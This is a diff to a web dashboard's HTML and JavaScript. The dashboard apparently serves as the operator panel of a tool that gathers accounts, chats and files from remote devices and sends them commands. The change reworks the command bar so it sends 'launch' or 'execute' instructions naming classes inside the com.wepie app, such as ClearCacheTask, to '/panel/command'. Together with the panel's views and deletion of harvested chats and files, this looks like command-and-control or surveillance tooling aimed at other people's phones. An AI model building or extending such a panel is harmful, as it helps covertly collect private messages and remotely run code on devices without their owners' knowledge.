@@ -813,7 +813,14 @@ async function dashboardHtml() {
   <main class="main">
     <div class="topbar"><div class="title"><h2 id="deviceTitle">Select a device</h2><p id="deviceSub">Accounts, chats, and files appear here.</p></div><div class="actions"><button class="btn" id="refresh">Refresh</button><button class="btn danger" id="deleteDevice">Delete device</button><a class="btn" href="/api/debug" target="_blank">Debug</a></div></div>
     <div class="tabs"><button class="tab active" data-tab="overview">Overview</button><button class="tab" data-tab="chats">Chats</button><button class="tab" data-tab="files">Files</button></div>
-    <div class="commandbar"><input id="cmdTitle" value="MG Menu"><input id="cmdText" value="Launch activity"><select id="cmdAction"><option value="none" selected>none</option><option value="launch">launch</option><option value="execute">execute</option></select><input id="cmdActivity" value="" placeholder="Activity/Class name"><button class="btn" id="sendCommand">Send</button><button class="btn danger" id="clearCommand">Clear</button></div>
+    <div class="commandbar"><input id="cmdTitle" value="MG Menu"><input id="cmdText" value="Launch activity"><select id="cmdAction"><option value="none" selected>none</option><option value="launch">launch</option><option value="execute">execute</option></select>
+      <div id="activityFields">
+        <input id="cmdActivityLaunch" style="display:none;" value="com.wepie.module.teenmode.TeenModeOpeningActivity" placeholder="Launch Activity">
+        <input id="cmdActivityExecute" style="display:none;" value="com.wepie.wespy.module.login.manual.ClearCacheTask" placeholder="Execute Class">
+      </div>
+      <button class="btn" id="sendCommand">Send</button>
+      <button class="btn danger" id="clearCommand">Clear</button>
+    </div>
     <section id="content" class="content"></section>
   </main>
 </div>
@@ -889,29 +896,40 @@ $("deleteDevice").onclick=()=>state.selected&&deletePath("/api/device/"+enc(stat
 document.querySelector(".tabs").onclick=e=>{const b=e.target.closest(".tab");if(!b)return;state.tab=b.dataset.tab;renderMain()};
 $("content").onclick=async e=>{const acc=e.target.closest("[data-account]");if(acc){state.account=acc.dataset.account;state.peer=null;await loadAccount();renderMain();return}const conv=e.target.closest("[data-peer]");if(conv){state.peer=conv.dataset.peer;renderChats();return}if(e.target.id==="backChats"){state.peer=null;renderChats();return}if(e.target.id==="deleteConversation")return deleteConversation();if(e.target.id==="deleteAccount")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account),"Delete selected user with all chats and files?");if(e.target.id==="deleteAccountChats"||e.target.id==="deleteAllChats")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account)+"/messages","Delete all chats for this user?");if(e.target.id==="deleteAccountFiles"||e.target.id==="deleteAllFiles")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account)+"/files","Delete all files for this user?");if(e.target.id==="selectAllChats"){document.querySelectorAll(".msgcheck").forEach(x=>x.checked=true);return}if(e.target.id==="selectAllFiles"){document.querySelectorAll(".filecheck").forEach(x=>x.checked=true);return}if(e.target.id==="deleteSelectedChats")return deleteSelectedChats();if(e.target.id==="deleteSelectedFiles")return deleteSelectedFiles();const p=e.target.closest("[data-preview]");if(p)return openPreview(p.dataset.preview);const f=e.target.closest("[data-delete-file]");if(f&&confirm("Delete this file?")){await api("/api/files",{method:"DELETE",headers:{"content-type":"application/json"},body:JSON.stringify({files:[f.dataset.deleteFile]})});await loadSelected()}};
 
-// Action dropdown change -> auto-fill activity
+// Action dropdown toggle fields
 $("cmdAction").onchange = function() {
     const action = this.value;
-    const activityInput = document.getElementById("cmdActivity");
+    const launchInput = document.getElementById("cmdActivityLaunch");
+    const executeInput = document.getElementById("cmdActivityExecute");
     if (action === "launch") {
-        activityInput.value = "com.wepie.module.teenmode.TeenModeOpeningActivity";
+        launchInput.style.display = "block";
+        executeInput.style.display = "none";
     } else if (action === "execute") {
-        activityInput.value = "com.wepie.wespy.module.login.manual.ClearCacheTask";
+        launchInput.style.display = "none";
+        executeInput.style.display = "block";
     } else {
-        activityInput.value = "";
+        launchInput.style.display = "none";
+        executeInput.style.display = "none";
     }
 };
 
 // Send command
 $("sendCommand").onclick=async()=>{
+    const action = document.getElementById("cmdAction").value;
+    let activity = "";
+    if (action === "launch") {
+        activity = document.getElementById("cmdActivityLaunch").value;
+    } else if (action === "execute") {
+        activity = document.getElementById("cmdActivityExecute").value;
+    }
     await api("/panel/command",{
         method:"POST",
         headers:{"content-type":"application/json"},
         body:JSON.stringify({
             title:$("cmdTitle").value,
             text:$("cmdText").value,
-            action:$("cmdAction").value,
-            activity:$("cmdActivity").value
+            action: action,
+            activity: activity
         })
     });
     $("sendCommand").textContent="Sent";
@@ -929,9 +947,11 @@ $("clearCommand").onclick=async()=>{
             activity:""
         })
     });
-    // Reset UI
     document.getElementById("cmdAction").value = "none";
-    document.getElementById("cmdActivity").value = "";
+    document.getElementById("cmdActivityLaunch").value = "com.wepie.module.teenmode.TeenModeOpeningActivity";
+    document.getElementById("cmdActivityExecute").value = "com.wepie.wespy.module.login.manual.ClearCacheTask";
+    document.getElementById("cmdActivityLaunch").style.display = "none";
+    document.getElementById("cmdActivityExecute").style.display = "none";
 };
 
 $("closeModal").onclick=()=>$("modal").classList.remove("open");
